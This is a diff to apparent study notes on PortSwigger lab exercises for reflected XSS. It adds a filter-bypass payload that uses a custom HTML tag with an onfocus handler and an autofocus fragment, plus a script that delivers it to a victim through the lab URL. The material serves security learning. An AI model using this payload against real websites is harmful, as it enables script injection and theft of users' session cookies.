@@ -180,6 +180,21 @@ We can add `hidden="hidden"` to hide our iframe on the browser
 
 ### Reflected XSS into HTML context with most tags and attributes blocked
 
-I wrote the methodology of this above, we are using burp intruder and the XSS cheatsheet to detect whcih tags and attributes aren't blocked and abuse it that way
+I wrote the methodology of this above, we are using burp intruder and the XSS cheatsheet to detect whcih tags and attributes aren't blocked and abuse it that way. Above under `Using XSS cheat sheet to find unblocked tags and attributes`
 
+### Reflected XSS into HTML context with all tags blocked except custom ones
 
+when we enter tags we get blocked with script, but we can attempt to create a new custom tag to use like this payload
+`<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';`
+
+enter that payload into an iframe and deliver to target
+
+```
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
+
+when viewing the exploit we can see it placed this as a new custom tag for our use case and exploited the `alert(document.cookie)`
+
+![image](https://github.com/user-attachments/assets/9264df6e-f02c-44b0-a475-15bf19b13406)
